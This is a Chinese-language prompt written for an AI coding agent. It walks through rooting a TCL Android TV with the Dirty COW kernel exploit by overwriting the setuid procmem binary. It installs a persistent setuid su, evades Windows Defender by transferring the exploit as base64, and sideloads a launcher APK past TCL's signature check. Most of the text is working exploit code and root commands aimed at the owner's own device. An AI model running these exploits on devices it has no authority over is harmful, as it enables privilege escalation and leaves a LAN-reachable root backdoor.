# 思路版 Prompt

把下面整段发给你的 AI 编码代理（Claude Code / Cursor 等），把开头的 `<TV_IP>`、`<APK>`、
`<PKG>`、`<CLS>` 换成你的电视 IP 和想装的桌面 APK。代理只需要 ADB、Android NDK、JDK 17 +
Android SDK（build-tools 34），不需要已有 root。

---

你帮我在这台 TCL 电视上完成四件事：获取临时 root、把 root 固化成可长期使用的 `su`、
安装一个第三方桌面 APK、并把它设为开机默认桌面和 Home 键目标。电视 IP 是 `<TV_IP>`，
想装的桌面是 `<APK>`（包名 `<PKG>`，MainActivity `<CLS>`，用 aapt 从 APK 里读，不要猜）。
只操作这一台我自己的电视，每一步先验证再继续；任何会改 `/system`、卸载/停用已有应用、
或固化 root 的动作，先向我确认再执行。

## 这台电视的已知事实（在真机 TCL 75U6900C / tsbU9800C 上验证过）

以下是验证机型的情况，作为参考基线。真正的门槛是"利用条件"（见阶段 0 的预检）：
只要内核能被 Dirty COW 利用、SELinux 关闭、有 setuid 的 `procmem`，这套方法就适用，
不要求一定是 tsbU9800C。

- Android 6.0（API 23），内核 3.10.86，安全补丁级别 2016-05-01，MStar，
  `ro.product.device=tsbU9800C`，SELinux Disabled。ADB 是 shell 用户（uid 2000），
  `adb root` 被拒绝。
- 内核存在 Dirty COW（CVE-2016-5195）。`/system/xbin/procmem` 是 setuid root
  （`librank`、`procrank` 也是），可作覆写目标。
- TCL 安装器拒绝一切声明 `android.intent.category.HOME` 的第三方 APK：
  `INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES: disable install launcher app not signature by tcl`，
  即使 uid 0 调 `pm install` 也拦（签名校验不看 uid）。普通 `pm install` 另外被禁
  （"install apk has be disabled from pm by system default!"）；
  `setprop persist.tcl.debug.installapk 1` + `setprop persist.tcl.installapk.enable 1`
  能放开普通 APK 的安装，但 HOME 包仍被上面的签名校验拦。
  （这一条是 TCL 固件特有的。如果预检发现这台电视不拦 HOME 包，直接 `adb install`
  装桌面，跳过阶段 3 的 /data/app 路线。）
- `pm disable-user` / `pm disable` / `pm hide` 对 shell 无权限；`pm hide com.tcl.cyberui`
  能持久但会导致"Android系统已停止运行"。`pm uninstall --user 0` 可用但**不要加 `-k`**
  （这台固件会假 Success，留下 installed=true 无 APK 的坏状态）。
- `/data/local/tmp` 每次重启会被清空；工具每次开机要重新 push。
- 标准 Resolver 选"始终"写入的是 `always=false` 的 last-chosen 记录，
  `findPreferredActivity` 会跳过；手改 `/data/system/users/0/package-restrictions.xml`
  会被 system_server 内存旧值写回。默认 Home 只能用运行时
  `IPackageManager.replacePreferredActivity` 设置。

## 阶段 0：预检与备份（必须最先做）

```bash
export MSYS_NO_PATHCONV=1            # Git Bash 必需，否则 /data/... 被改写成 Windows 路径
adb connect <TV_IP>:5555

adb shell 'uname -m; getprop ro.build.version.sdk; getprop ro.build.version.security_patch; getenforce'
# 关注四项：arm64（aarch64）/ Android 5-7.x / 安全补丁级别早于 2016-10（COW 大概率未修复）/ 
#           SELinux Disabled 或 Permissive
adb shell 'ls -l /system/xbin/procmem /system/xbin/librank /system/xbin/procrank'
# 预期至少一个是 -rwsr-xr-x root root
```

预检看的是**利用条件**，不是具体机型——不要求 tsbU9800C，满足以下条件就能继续：
内核能被 Dirty COW 利用（版本号只是参考，以阶段 1 实际跑 PoC 成功为准）、SELinux 关闭、
有 setuid 的 `procmem`（或 librank/procrank）、arm64。条件不满足就停下告诉我，不要硬来。
另外先试一次 `adb install <APK>`：如果不被拦，说明这台电视不需要 /data/app 路线，直接装
完再做阶段 4 即可。

备份（存到工作目录 `work/backup/`）：`pm list packages -f`、`getprop`、
`settings list system/secure/global`、`dumpsys package`、`dumpsys activity activities`。

**关键**：在第一次 Dirty COW 之前把原版 procmem 拉到 PC——COW 只改页缓存，之后读到的
就是 payload 不是原文件了：

```bash
adb pull /system/xbin/procmem work/backup/procmem.orig
md5sum work/backup/procmem.orig    # 该固件为 5e53308db5a02f1abc555ea15ceac4c6，记下实际值
```

## 阶段 1：临时 root（Dirty COW，ptrace 分支）

用 timwr/CVE-2016-5195，NDK 编 arm64。把上游 `dirtycow.c` 里的
`if (canwritetoselfmem(mem_arg) == -1)` 改成 `if (1)` 强制走 ptrace 写入（比
/proc/self/mem 路径稳）：

```bash
CC=$NDK/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android23-clang
$CC -O2 -DDEBUG -o dirtycow_ptrace dirtycow.c dcow.c -llog -pthread
$CC -O2 -o rootsh2 rootsh2.c
```

payload `rootsh2.c`（setuid 后起 root shell）：

```c
#include <unistd.h>
int main(void) {
    setgid(0); setuid(0);
    setresgid(0, 0, 0); setresuid(0, 0, 0);
    execl("/system/bin/sh", "sh", (char *)0);
    return 1;
}
```

Windows Defender 会在写入瞬间删除 `dirtycow_ptrace` 这个 ELF（改名、换目录都拦）。
对策：PC 上 `base64 dirtycow_ptrace > dirtycow_ptrace.b64`，push `.b64` 到电视再解码，
PC 上不落地 ELF：

```bash
adb push dirtycow_ptrace.b64 /data/local/tmp/dcow.b64
adb shell 'toybox base64 -d /data/local/tmp/dcow.b64 > /data/local/tmp/dcow_ptrace; chmod 755 /data/local/tmp/dcow_ptrace'
```

执行覆写并验证：

```bash
adb push rootsh2 /data/local/tmp/rootsh2
adb shell 'chmod 755 /data/local/tmp/rootsh2'
adb shell '/data/local/tmp/dcow_ptrace /data/local/tmp/rootsh2 /system/xbin/procmem --no-pad'
adb shell "echo 'id; getenforce' | /system/xbin/procmem"
# 预期 uid=0(root)
```

之后所有 root 操作都走这个模式：`adb shell "echo '命令' | /system/xbin/procmem"`。
COW 有小概率让电视重启，重启后重新 push、重跑即可。

## 阶段 2：固化 root（/system/xbin/su，4750 root:shell）

先编译静态 su：

```c
#include <unistd.h>
#include <string.h>
int main(int argc, char **argv) {
    setgid(0); setuid(0);
    setresgid(0, 0, 0); setresuid(0, 0, 0);
    if (argc >= 3 && strcmp(argv[1], "-c") == 0)
        execl("/system/bin/sh", "sh", "-c", argv[2], (char *)0);
    else
        execl("/system/bin/sh", "sh", (char *)0);
    return 1;
}
```

```bash
$CC -O2 -static -o su su.c
adb push su /data/local/tmp/su
adb push work/backup/procmem.orig /data/local/tmp/procmem.orig
adb shell 'chmod 755 /data/local/tmp/su'
```

**写 /system 的安全模板（顺序不能变，这条是整个教程最容易翻车的地方）：**
Dirty COW 改的是 procmem 的页缓存；如果 `sync` 前没把原文件写回去，
`mount -o rw,remount /system` + `sync` 会把脏页回写到系统分区，触发块层保护直接重启。
所以任何 `/system` 写入都必须在同一个 root 管道里完成"改 → 恢复 procmem → 校验 md5 → sync"：

```bash
adb shell "echo '\
mount -o rw,remount /system; \
cp /data/local/tmp/su /system/xbin/su; \
chown root:shell /system/xbin/su; \
chmod 4750 /system/xbin/su; \
ls -l /system/xbin/su; \
cp /data/local/tmp/procmem.orig /system/xbin/procmem; \
md5sum /system/xbin/procmem; \
sync' | /system/xbin/procmem"
```

检查三点：`ls -l` 是 `-rwsr-x--- root shell`；md5 等于阶段 0 记的原值；命令返回后
**等 30-60 秒**确认电视没自己复位，再 `adb reboot`。`chown` 会清 setuid，
所以必须 chown → chmod 这个顺序。只写 `/data`（包括阶段 3）不需要这套模板，
`sync` + `reboot` 直接安全。

重启后验证：`adb shell '/system/xbin/su -c id'` 应为 uid=0。

## 阶段 3：安装第三方桌面（/data/app 开机扫描）

Android 6 开机会扫描 `/data/app/<包名>-1/base.apk` 并收进包管理器，**不走 TCL 的 HOME
签名校验**。有持久 su 后（没固化 su 就把下面命令里的 `su -c '...'` 换成
`echo '...' | /system/xbin/procmem`，并先重新 push rootsh2 重跑一次阶段 1）：

```bash
adb push <APK> /data/local/tmp/launcher.apk
adb shell "su -c '
  mkdir -p /data/app/<PKG>-1;
  cp /data/local/tmp/launcher.apk /data/app/<PKG>-1/base.apk;
  chown 1000:1000 /data/app/<PKG>-1 /data/app/<PKG>-1/base.apk;
  chmod 755 /data/app/<PKG>-1;
  chmod 644 /data/app/<PKG>-1/base.apk;
  sync'"
adb reboot
# 重启后网络 ADB 会断开：先 adb connect <TV_IP>:5555 再继续
adb shell "pm path <PKG>"     # 预期 package:/data/app/<PKG>-1/base.apk
adb shell "am start -n <PKG>/<CLS>"   # 确认 UI 能打开
```

目录名必须是 `<PKG>-1`、文件名必须是 `base.apk`、owner 1000:1000、目录 755 / APK 644。
`pm path` 为空就查这几项；不要回头试 `pm install`。

## 阶段 4：设为默认桌面 + Home 键

两层配置都要：

```bash
# 1) TCL 开机桌面
adb shell "su -c 'setprop persist.sys.bootpackage <PKG>'"
```

2) Home 键路由用运行时 `replacePreferredActivity`。写一个 `SetHome.java`
（`IPackageManager` 是 hidden 类，全部反射）：`queryIntentActivities(MAIN+HOME)` 拿全部
候选 → 对每个候选 `clearPackagePreferredActivities` → 
`replacePreferredActivity(filter MAIN+HOME+DEFAULT, 0x100000, 候选集, 目标, 0)`。
**第二个参数必须是 0x100000**（HOME preferred 的 mMatch；候选 query 打印的 0x108000
不是这个参数）。支持 `--system` 前缀先 `setUid(1000)` 以防 binder 权限问题。

编译：`javac --release 8 -cp android.jar` + `d8 --min-api 23` + 把 classes.dex 打进 jar。

```bash
adb push SetHome.jar /data/local/tmp/
adb shell "su -c 'CLASSPATH=/data/local/tmp/SetHome.jar app_process /system/bin SetHome <PKG> <CLS>'"
```

等 30 秒让 `scheduleWritePackageRestrictions` 落盘，重启。

## 验证清单（全部满足才算完成）

```bash
adb shell getprop persist.sys.bootpackage                    # = <PKG>
adb shell "pm path <PKG>"                                    # /data/app/<PKG>-1/base.apk
adb shell dumpsys activity activities | grep -m1 mResumedActivity   # <PKG>/<CLS>
adb shell dumpsys activity | grep -m1 mHomeProcess           # <PKG>
adb shell "dumpsys package | grep -A40 'Preferred Activities User 0:'" \
  | grep -A8 'android.intent.action.MAIN'                    # mMatch=0x100000 mAlways=true
adb shell input keyevent 3
adb shell dumpsys activity activities | grep -m1 mResumedActivity   # 仍是 <PKG>/<CLS>
```

## 注意与回滚

- 如果装的是会抢 Home 的桌面（如当贝，有 `HomeKeyEventCatchService`，开机自我恢复并改回
  bootpackage），`pm disable-user`/`force-stop` 都压不住，只能卸载它或把它的
  `/data/app/<pkg>-1/base.apk` 改名（数据保留，改回即恢复）。
- 回滚到原桌面：`setprop persist.sys.bootpackage com.tcl.cyberui` + 
  `SetHome com.tcl.cyberui com.tcl.cyberui.MainActivity` + 重启（CyberUI 一直安装着）。
- 取消固化 root：root 窗口里 `rm -f /system/xbin/su`，再按模板恢复 procmem + sync。
- 收尾提醒我：不用时关闭电视的网络调试（4750 的 su + ADB 打开 = 任意局域网者可 root）。
- 绝对不要做：`pm uninstall -k --user 0`、`pm hide com.tcl.cyberui`、
  没恢复 procmem 就 remount+sync `/system`、`pm install` 装 HOME 包。

执行中任何一步输出和预期不符就停下来向我汇报，不要自行跳步。
